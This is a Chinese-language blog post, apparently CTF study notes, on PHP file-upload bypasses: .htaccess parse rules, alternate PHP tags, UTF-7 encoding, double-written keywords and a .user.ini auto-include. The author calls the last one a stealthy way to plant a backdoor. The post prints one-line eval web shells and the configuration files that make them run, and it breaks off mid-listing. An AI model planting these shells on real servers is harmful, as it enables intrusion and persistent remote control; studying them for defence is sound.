@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>文件上传漏洞 | chickenmushroom&#39;s blog</title>
+  <meta name="description" content="文件上传漏洞.htaccess任意文件解析当服务器对上传文件的类型进行限制的时候，可以上传.htaccess文件重新配置文件的解析。简单来说，将不是.php文件解析成.php文件。比如上传的文件是1.jpg,可以用.htaccess文件将1.jpg解析成1.php。 .htaccess文件配置信息，将后缀为.aaa的文件均解析为php文件。 1AddType application&#x2F;x-httpd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="http://example.com/2020/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文件上传漏洞.htaccess任意文件解析当服务器对上传文件的类型进行限制的时候，可以上传.htaccess文件重新配置文件的解析。简单来说，将不是.php文件解析成.php文件。比如上传的文件是1.jpg,可以用.htaccess文件将1.jpg解析成1.php。 .htaccess文件配置信息，将后缀为.aaa的文件均解析为php文件。 1AddType application&#x2F;x-httpd">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024155350006.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024155315606.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024155514642.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024155646059.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024160110150.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024160743168.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024160813089.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024163112497.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024205312985.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024205348890.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024212357513.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024212442665.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024221659363.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025133402059.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025134101049.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025134343746.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025134504010.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025134628032.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025204841635.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025205028132.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025205545739.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025205616330.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025205504399.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025210307444.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20201025210329259.png">
+<meta property="article:published_time" content="2020-10-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-25T14:44:44.613Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cr_7.gitee.io/git-hub-image/image-20201024155350006.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2020/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">chickenmushroom</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" rel="tag">PHP小项目</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WriteUp/" rel="tag">WriteUp</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a><span class="tag-list-count">10</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" style="font-size: 13px;">PHP小项目</a> <a href="/tags/WriteUp/" style="font-size: 13px;">WriteUp</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 14px;">学习笔记</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/13/hello-world/" class="title">Hello World</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-13T12:47:23.669Z" itemprop="datePublished">2021-11-13</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/01/31/%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="title">我TMD烦死了学习笔记</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-01-30T16:00:00.000Z" itemprop="datePublished">2021-01-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/23/easyphp%E4%B9%8Bcreate_function/" class="title">easyphp之create_function</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-22T16:00:00.000Z" itemprop="datePublished">2020-12-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/23/easysql_cat/" class="title">easysql_cat</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-22T16:00:00.000Z" itemprop="datePublished">2020-12-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/23/%E6%9D%82%E9%A1%B9%EF%BC%88%E4%B8%80%EF%BC%89/" class="title">杂项（一）</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-22T16:00:00.000Z" itemprop="datePublished">2020-12-23</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">Catalogue</h3>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">.htaccess任意文件解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">短标签绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-UTF-7"><span class="toc-number">1.3.</span> <span class="toc-text">特殊编码绕过(UTF-7)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#user-ini%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">.user.ini绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text">.htaccess文件换行绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%8B%BC%E6%8E%A5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.7.</span> <span class="toc-text">动态拼接函数绕过函数过滤</span></a></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-文件上传漏洞" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      文件上传漏洞
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+	  <time datetime="2020-10-23T16:00:00.000Z" itemprop="datePublished">2020-10-24</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h4><p>当服务器对上传文件的类型进行限制的时候，可以上传.htaccess文件重新配置文件的解析。简单来说，将不是.php文件解析成.php文件。比如上传的文件是1.jpg,可以用.htaccess文件将1.jpg解析成1.php。</p>
+<p>.htaccess文件配置信息，将后缀为.aaa的文件均解析为php文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa<span class="comment">//将.aaa换成其他比如.jpg就会将.jpg文件解析成.php文件</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h4><p>这里会有版本的影响，JS只能在PHP5使用，PHP7不支持ASP</p>
+<p>使用场景：当例如&lt;?php被过滤了，就可以使用其他标签风格来编写。</p>
+<ul>
+<li>JS风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>短标签风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&lt;?=?&gt;</code>与<code>&lt;?php echo ....?&gt;</code>等效</li>
+<li>ASP风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>官方默认风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>例如upload2</p>
+<p>尝试直接上传一个一句话木马</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024155350006.png" alt="image-20201024155350006"></p>
+<p>发现说此文件不允许上传，一般来说都不会允许上传php文件的。所以先上传一个.htaccess</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024155315606.png" alt="image-20201024155315606"></p>
+<p>再上传一句话木马</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024155514642.png" alt="image-20201024155514642"></p>
+<p>显示Can’t upload php file。那就换一个短标签。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024155646059.png" alt="image-20201024155646059"></p>
+<p>上传成功。连蚁剑找到flag</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024160110150.png" alt="image-20201024160110150"></p>
+<h4 id="特殊编码绕过-UTF-7"><a href="#特殊编码绕过-UTF-7" class="headerlink" title="特殊编码绕过(UTF-7)"></a>特殊编码绕过(UTF-7)</h4><p>如果程序过滤了所有标签形式、或者说过滤了<code>&lt;?</code>而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），我们就使用UTF-7进行编码，然后再使用.htaccess对UTF-7编码的文件进行解码。</p>
+<p>例如upload4</p>
+<ul>
+<li>.htaccess</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>mua.aaa</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#x27;a&#x27;+AF0)+ADs?+AD4-</span><br><span class="line">//&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传.htaccess<img src="http://cr_7.gitee.io/git-hub-image/image-20201024160743168.png" alt="image-20201024160743168"></p>
+<p>上传mua.aaa<img src="http://cr_7.gitee.io/git-hub-image/image-20201024160813089.png" alt="image-20201024160813089"></p>
+<p>拿flag<img src="http://cr_7.gitee.io/git-hub-image/image-20201024163112497.png" alt="image-20201024163112497"></p>
+<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>假如上传的内容被检测出来且替换为空，则可以使用双写绕过。例如：文件中的php、eval等被匹配检测出来并替换为空，我们就将内容写成pphp、eevalval，这样就可以在替换完之后，变成php、eval。</p>
+<p>例如upload3</p>
+<p>先上传一个.htaccess解析文件再说</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<p>上传成功。</p>
+<p>再上传一个标准的一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024205312985.png" alt="image-20201024205312985"></p>
+<p>结果弹出一个下载mua.aaa窗口，下载回来看看。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024205348890.png" alt="image-20201024205348890"></p>
+<p>结果发现，php，eval，post都没了。应该就是被检测到敏感字符并被替换成空了。试试双写上传。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>pphphp</span><br><span class="line">@eevalval(<span class="variable">$_PPOSTOST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下载回来看到：</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024212357513.png" alt="image-20201024212357513"></p>
+<p>正常，但是不能运行。原因是.htaccess文件里的php也被替换成空了。再双写上传一次：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-pphphp .aaa</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024212442665.png" alt="image-20201024212442665"></p>
+<h4 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h4><p>执行php文件时，会扫描每个目录的ini文件，范围就是从所在文件目录开始一直上升到根目录。所以 .user.ini实际上就是一个可以由用户“自定义”的一个php.ini文件。</p>
+<p>.user.ini配置项里有一个auto_prepend_file。作用是指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。</p>
+<p><strong>注意：要用到.user.ini必须在文件夹里有php文件。</strong></p>
+<p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=01.gif //01.gif是要包含的文件</span><br></pre></td></tr></table></figure>
+
+<p>新建一个目录test，包含.user.ini、01.gif、test.php三个文件</p>
+<p>.user.ini</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201024221659363.png" alt="image-20201024221659363"></p>
+<p>01.gif</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;sb&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试结果：</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025133402059.png" alt="image-20201025133402059"></p>
+<p>所以这是一个留后门很好的方法，隐秘性也很高。</p>
+<h4 id="htaccess文件换行绕过"><a href="#htaccess文件换行绕过" class="headerlink" title=".htaccess文件换行绕过"></a>.htaccess文件换行绕过</h4><p>上传的.htaccess文件内容被过滤时，可以对内容进行换行绕过。因为.htaccess支持换行编写。</p>
+<p>例如upload6</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025134101049.png" alt="image-20201025134101049"></p>
+<p>上传时发现出错，报告“内容不能有application”。那就是被检测到阻止上传。换行内容上传试试。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025134343746.png" alt="image-20201025134343746"></p>
+<p>上传成功了。再上传一句话木马。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025134504010.png" alt="image-20201025134504010"></p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025134628032.png" alt="image-20201025134628032"></p>
+<h4 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h4><p>例题：upload7</p>
+<p>先扫一扫目录，发现有备份文件</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025204841635.png" alt="image-20201025204841635"></p>
+<p>下载备份文件。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025205028132.png" alt="image-20201025205028132"></p>
+<p>将文件名改成.index.php.swp在Linux下用vim打开</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025205545739.png" alt="image-20201025205545739"></p>
+<p>R恢复源码</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025205616330.png" alt="image-20201025205616330"></p>
+<p>获得源码</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025205504399.png" alt="image-20201025205504399"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;../upload&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=strlen(<span 